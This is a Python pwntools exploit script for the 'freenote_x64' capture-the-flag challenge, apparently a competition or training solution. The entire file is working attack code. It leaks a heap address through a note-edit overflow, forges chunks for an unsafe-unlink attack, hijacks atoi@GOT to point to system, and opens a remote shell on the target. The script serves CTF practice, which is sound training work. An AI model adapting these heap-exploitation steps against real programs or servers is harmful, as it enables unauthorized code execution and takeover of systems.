#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'

DEBUG = True
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    DEBUG = False

MANUAL_ADDRESS = False
EXE = './freenote_x64'
UNIT_LEN = 512
NOTE_COUNT = 6

class Local:
    LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
    HOST = '127.0.0.1'
    PORT = 4444

class Remote:
    LIBC = './libc-2.19.so'
    HOST = 'pwn2.jarvisoj.com'
    PORT = 9886

class NoteAction:
    def __init__(self, io):
        self.io = io
    
    def list_note(self, recv=True):
        if recv:
            self.io.sendlineafter('Your choice: ', '1')
        else:
            self.io.sendline('1')
        out = self.io.recvuntil('== 0ops Free Note ==\n') 
        pos = out.find('== 0ops Free Note ==')
        return out[:pos]

    def new_note(self, content, recv=True):
        if recv:
            self.io.sendlineafter('Your choice: ', '2')  # new note
        else:
            self.io.sendline('2')
        self.io.sendlineafter('Length of new note: ', str(len(content)))
        self.io.sendafter('Enter your note: ', content)

    def edit_note(self, idx, content, recv=True):
        if recv:
            self.io.sendlineafter('Your choice: ', '3')
        else:
            self.io.sendline('3')
        self.io.sendlineafter('Note number: ', str(idx))
        self.io.sendlineafter('Length of note: ', str(len(content)))
        self.io.sendafter('Enter your note: ', content)

    def delete_note(self, idx, recv=True):
        if recv:
            self.io.sendlineafter('Your choice: ', '4')
        else:
            self.io.sendline('4')
        self.io.sendlineafter('Note number: ', str(idx))

class Address:
    heap_base = None
    ptr_note_content = [None for i in xrange(NOTE_COUNT)]
    note_chunk = [None for i in xrange(NOTE_COUNT)]
    note_content = [None for i in xrange(NOTE_COUNT)]

    @staticmethod
    def calc_addr(heap_base):
        Address.heap_base = heap_base
        Address.ptr_note_content = [heap_base + 0x18 * (i + 1) + 8 for i in xrange(NOTE_COUNT)]
        Address.note_chunk = [heap_base + 0x1810 + (8 * 2 + UNIT_LEN) * i for i in xrange(NOTE_COUNT)]
        Address.note_content = [Address.note_chunk[i] + 0x10 for i in xrange(NOTE_COUNT)]

    @staticmethod
    def print_addr():
        log.success('heap_base = {}'.format(hex(Address.heap_base)))
        for i in xrange(NOTE_COUNT):
            log.success('ptr_note[{}]_content = {}'.format(i, hex(Address.ptr_note_content[i])))
        for i in xrange(NOTE_COUNT):
            log.success('note[{}]_chunk_addr = {}'.format(i, hex(Address.note_chunk[i])))
        for i in xrange(NOTE_COUNT):
            log.success('note[{}]_content_addr = {}'.format(i, hex(Address.note_content[i])))

def main():
    if DEBUG:
        config = Local
    else:
        config = Remote
    exe = ELF(EXE)
    libc = ELF(config.LIBC)
    io = remote(config.HOST, config.PORT)
    na = NoteAction(io)
    # init
    # create 6 notes and delete 0th, 2nd, 4th note
    for i in xrange(NOTE_COUNT):
        na.new_note(UNIT_LEN * 'A')

    for i in xrange(0, NOTE_COUNT, 2):
        na.delete_note(i)

    if MANUAL_ADDRESS:
        heap_base = input('input heap_base: ')
    else:
        # leak memory
        heap_over_flow_length = UNIT_LEN + 8 * 2
        padding = heap_over_flow_length * 'B'
        na.edit_note(1, padding)
        out = na.list_note()
        out0 = out.split('\n')[0]
        pos = out0.find(padding)
        _ = out0[pos + heap_over_flow_length:]
        log.debug(str(len(_)) + repr(_))
        if len(_) <= 2:
            log.error('May be "00" in address, cannot get true address. Please re-try ...')
            sys.exit(-1)
        note0_chunk_addr = u64(_.ljust(8, '\x00'))
        
        heap_base = note0_chunk_addr - 0x1810

    Address.calc_addr(heap_base)
    Address.print_addr()

    raw_input('wait debug')

    na.delete_note(3)  # delete note 3

    # construct payload note1 to double free note 2
    payload = ''
    payload += p64(0)  # fake note1 - prev size
    payload += p64(UNIT_LEN)  # fake note1 - size & flag
    payload += p64(Address.ptr_note_content[1] - 0x18)  # fake note1 - fd
    payload += p64(Address.ptr_note_content[1] - 0x10)  # fake note1 - bk
    payload += (UNIT_LEN - len(payload)) * 'C'  # padding
    payload += p64(UNIT_LEN)  # fake note2 - prev size
    payload += p64(UNIT_LEN + 8 * 2 + 0)  # fake note2 - size & flag
    payload += UNIT_LEN * 'C'
    payload += p64(0)
    payload += p64(UNIT_LEN + 8 * 2 + 1)
    
    print len(payload)
    na.edit_note(1, payload)
    
    raw_input('wait debug')

    na.delete_note(2)

    na.new_note(8 * 'D')  # 填充note0

    payload = ''
    payload += p64(exe.got['atoi'])  # ptr note0 content
    payload += p64(1)  # note 1 available
    payload += p64(8)  # note length
    payload += p64(Address.ptr_note_content[0])  # 保持该地址
    payload += (0x420 - len(payload)) * '\x00'  # 后面全部清零

    na.edit_note(1, payload)  # 改写note0为atoi@got

    out = na.list_note()

    atoi_addr = u64(out.split('\n')[0][3:].ljust(8, '\x00'))
    log.success('atoi_addr = {}'.format(hex(atoi_addr)))
    system_addr = libc.symbols['system'] - libc.symbols['atoi'] + atoi_addr
    log.success('system_addr = {}'.format(hex(system_addr)))

    na.edit_note(0, p64(system_addr))

    io.sendlineafter('Your choice: ', '/bin/sh\x00')

    io.interactive()
    io.close()

main()
